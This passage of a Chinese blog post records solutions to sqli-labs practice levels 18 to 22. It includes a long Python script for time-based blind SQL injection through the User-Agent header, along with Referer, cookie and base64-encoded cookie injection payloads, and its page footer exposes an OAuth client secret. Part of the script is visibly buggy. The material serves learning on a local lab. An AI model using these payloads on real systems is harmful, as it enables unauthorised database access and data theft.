class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">txt1 = &quot;Mozilla/5.0 Firefox/56.0&apos; or if(ascii(substr((select database()),&quot;</span><br><span class="line">txt2 = &quot;,1))&gt;=&quot;</span><br><span class="line">txt3 = &quot;,1))=&quot;</span><br><span class="line">txt4 = &quot;,sleep(2),sleep(0)) or &apos;&quot;</span><br><span class="line">key = &#123;&apos;uname&apos;:&apos;admin&apos;,&apos;passwd&apos;:&apos;admin&apos;,&apos;submit&apos;:&apos;Submit&apos;&#125;</span><br><span class="line">url = &quot;http://localhost/sqli-labs/Less-18/&quot;</span><br><span class="line">num11 = 97</span><br><span class="line">num12 = 65</span><br><span class="line">num13 = 48</span><br><span class="line">code = &apos;&apos;</span><br><span class="line">num1 = 0</span><br><span class="line">num2 = 0</span><br><span class="line">num3 = 0</span><br><span class="line">for i in range(1,9):</span><br><span class="line">	payload = txt1+str(i)+txt2+str(num11)+txt4</span><br><span class="line">	headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">	time1 = time.time()</span><br><span class="line">	req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">	time2 = time.time()</span><br><span class="line">	if(time2 - time1 &gt;=2):</span><br><span class="line">		num1 = 1</span><br><span class="line">		</span><br><span class="line">	payload = txt1+str(i)+txt2+str(num12)+txt4</span><br><span class="line">	headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">	time1 = time.time()</span><br><span class="line">	req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">	time2 = time.time()</span><br><span class="line">	if(time2 - time1 &gt;=2):</span><br><span class="line">		num2 = 1</span><br><span class="line"></span><br><span class="line">	payload = txt1+str(i)+txt2+str(num13)+txt4</span><br><span class="line">	headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">	time1 = time.time()</span><br><span class="line">	req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">	time2 = time.time()</span><br><span class="line">	if(time2 - time1 &gt;=2):</span><br><span class="line">		num3 = 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	if(num1 == 1):</span><br><span class="line">		num = 97</span><br><span class="line">		num += 13</span><br><span class="line">		payload = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		if(time2 - time1 &gt;=2):</span><br><span class="line">			num += 6</span><br><span class="line">		else:</span><br><span class="line">			num -= 7</span><br><span class="line">		payload = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		if(time2 - time1 &gt;=2):</span><br><span class="line">			num += 3</span><br><span class="line">		else:</span><br><span class="line">			num -= 3</span><br><span class="line">		payload = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		if(time2 - time1 &lt;=2):</span><br><span class="line">			num -= 3</span><br><span class="line">		if((num == 106) or (num == 119)):</span><br><span class="line">			for j in range(num,num+4):</span><br><span class="line">				payload = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				if(time2 - time1 &gt;=2):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					print code</span><br><span class="line">					num1 = 0</span><br><span class="line">					num2 = 0</span><br><span class="line">					num3 = 0</span><br><span class="line">		else:</span><br><span class="line">			for j in range(num,num+3):</span><br><span class="line">				payload = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				if(time2 - time1 &gt;=2):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					print code</span><br><span class="line">					num1 = 0</span><br><span class="line">					num2 = 0</span><br><span class="line">					num3 = 0</span><br><span class="line">	if(num1 == 0 and num2 == 1):</span><br><span class="line">		num = 65</span><br><span class="line">		num += 13</span><br><span class="line">		payload = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		if(time2 - time1 &gt;=2):</span><br><span class="line">			num += 6</span><br><span class="line">		else:</span><br><span class="line">			num -= 7</span><br><span class="line">		payload = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		if(time2 - time1 &gt;=2):</span><br><span class="line">			num += 3</span><br><span class="line">		else:</span><br><span class="line">			num -= 3</span><br><span class="line">		payload = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		if(time2 - time1 &lt;=2):</span><br><span class="line">			num -= 3</span><br><span class="line">		if((num == 74) or (num == 87)):</span><br><span class="line">			for j in range(num,num+4):</span><br><span class="line">				payload = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				if(time2 - time1 &gt;=2):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					print code</span><br><span class="line">					num1 = 0</span><br><span class="line">					num2 = 0</span><br><span class="line">					num3 = 0</span><br><span class="line">		else:</span><br><span class="line">			for j in range(num,num+3):</span><br><span class="line">				payload = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				if(time2 - time1 &gt;=2):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					print code</span><br><span class="line">					num1 = 0</span><br><span class="line">					num2 = 0</span><br><span class="line">					num3 = 0</span><br><span class="line">	if(num2 == 0 and num3 == 1):</span><br><span class="line">		num =48</span><br><span class="line">		num += 5</span><br><span class="line">		payload = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.get(url = url)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		if(time2 - time1 &gt;=2):</span><br><span class="line">			for j in range(num,num+5):</span><br><span class="line">				url = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				if(time2 - time1 &gt;=2):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					print code</span><br><span class="line">					num1 = 0</span><br><span class="line">					num2 = 0</span><br><span class="line">					num3 = 0</span><br><span class="line">		else:</span><br><span class="line">			num -= 5</span><br><span class="line">			for j in range(num,num+5):</span><br><span class="line">				payload = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				headers = &#123;&apos;User-Agent&apos;: payload&#125;</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.post(url = url,data =key,headers = headers)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				if(time2 - time1 &gt;=2):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					print code</span><br><span class="line">					num1 = 0</span><br><span class="line">					num2 = 0</span><br><span class="line">					num3 = 0</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/14.png" alt="14"></p><h5 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h5><p>跟第十八关一样，referer注入，也是insert语句<br>修改请求头<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://localhost/sqli-labs/Less-19/&apos; or if(ascii(substr((select database()),1,1))&gt;97,sleep(5),sleep(0)) or &apos;</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/15.png" alt="15"><br>5秒后页面返回正常，脚本参考上面的</p><h5 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h5><p>cookie注入，这一关要先登录，登陆后有cookie才可以注入<br>测试单引号，在cookie后面加一个单引号<br><img src="/img/2018-08-03/17.png" alt="17"><br>用<code>order by</code>测试有多少列<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&apos; order by 4#</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/18.png" alt="18"><br>查数据库<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=admin&apos; union select 1,2,database() limit 1,1#</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/19.png" alt="19"><br>后面的一样了</p><div style="text-align:center">————————-2018-08-10更新————————-<br></div><h5 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h5><p>用<code>admin</code>，<code>admin</code>登陆后抓包看到cooie<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4%3D</span><br></pre></td></tr></table></figure><p></p><p>url解码后<code>YWRtaW4=</code>，用base64尝试解码得到<code>admin</code>，那么cookie应该就是用了base64加密过的，和第二十关一样，多了base64加密，<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkgbGltaXQgMSwxIw%3D%3D</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/21.png" alt="21"></p><h5 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h5><p>和第二十一关一样，单引号变双引号<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIHVuaW9uIHNlbGVjdCAxLDIsZGF0YWJhc2UoKSBsaW1pdCAxLDEj</span><br></pre></td></tr></table></figure><p></p><p>第一部分</p><p>完、</p></div><div><div><div style="text-align:center;color:#ccc;font-size:14px">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/注入/" rel="tag"><i class="fa fa-tag"></i> 注入</a><a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a><a href="/tags/盲注/" rel="tag"><i class="fa fa-tag"></i> 盲注</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2018/07/26/proxmark3/" rel="next" title="Proxmark3 Easy破解门禁卡学习过程"><i class="fa fa-chevron-left"></i> Proxmark3 Easy破解门禁卡学习过程</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"> <a href="/2018/08/17/sqli-labs3/" rel="prev" title="sqli-labs的学习记录三（23-30）">sqli-labs的学习记录三（23-30）<i class="fa fa-chevron-right"></i></a></div></div></footer></div></article><div class="post-spread"></div></div></div><div class="comments" id="comments"><div id="gitment-container"></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span><span class="sidebar-toggle-line sidebar-toggle-line-middle"></span><span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap"> 文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap"> 站点概览</li></ul><section class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" src="/img/touxiang/touxiang.jpg" alt="Lzy-wi"><p class="site-author-name" itemprop="name">Lzy-wi</p><p class="site-description motion-element" itemprop="description"></p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">13</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/index.html"><span class="site-state-item-count">23</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/Lzy-wi" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i> GitHub</a></span><span class="links-of-author-item"><a href="mailto:1721389906@qq.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i> E-Mail</a></span></div></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-5"><a class="nav-link" href="#第九关"><span class="nav-number">1.</span> <span class="nav-text">第九关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十关"><span class="nav-number">2.</span> <span class="nav-text">第十关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十一关"><span class="nav-number">3.</span> <span class="nav-text">第十一关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十二关"><span class="nav-number">4.</span> <span class="nav-text">第十二关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十三关"><span class="nav-number">5.</span> <span class="nav-text">第十三关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十四关"><span class="nav-number">6.</span> <span class="nav-text">第十四关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十五关"><span class="nav-number">7.</span> <span class="nav-text">第十五关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十六关"><span class="nav-number">8.</span> <span class="nav-text">第十六关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十七关"><span class="nav-number">9.</span> <span class="nav-text">第十七关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十八关"><span class="nav-number">10.</span> <span class="nav-text">第十八关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第十九关"><span class="nav-number">11.</span> <span class="nav-text">第十九关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第二十关"><span class="nav-number">12.</span> <span class="nav-text">第二十关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第二十一关"><span class="nav-number">13.</span> <span class="nav-text">第二十一关</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#第二十二关"><span class="nav-number">14.</span> <span class="nav-text">第二十二关</span></a></li></ol></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright" style="text-align:center">&copy; <span itemprop="copyrightYear">2018</span><span class="with-love"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">Lzy-wi</span></div><div style="text-align:center"><div class="powered-by"><i class="fa fa-user-md"></i> <span id="busuanzi_container_site_uv">本站访客数:<span id="busuanzi_value_site_pv"></span></span></div><div class="theme-info"><div class="powered-by"></div> <span class="post-count">博客全站共18.0k字</span></div></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/custom/custom.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css"><script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script><style>a.gitment-editor-footer-tip{display:none}.gitment-container.gitment-footer-container{display:none}</style><script type="text/javascript">function renderGitment(){new Gitmint({id:window.location.pathname,owner:"Lzy-wi",repo:"gitment-comments",lang:navigator.language||navigator.systemLanguage||navigator.userLanguage,oauth:{client_secret:"f505e0931d7b3481f41ba49d0a62c32ed958ab03",client_id:"a6008e5dc6be6020bf5f"}}).render("gitment-container")}renderGitment()</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({pluginRootPath:"live2dw/",pluginJsPath:"lib/",pluginModelPath:"assets/",tagMode:!1,log:!1,model:{jsonPath:"/live2dw/assets/nico.model.json"},display:{position:"right",width:100,height:200},mobile:{show:!1}})</script></body></html>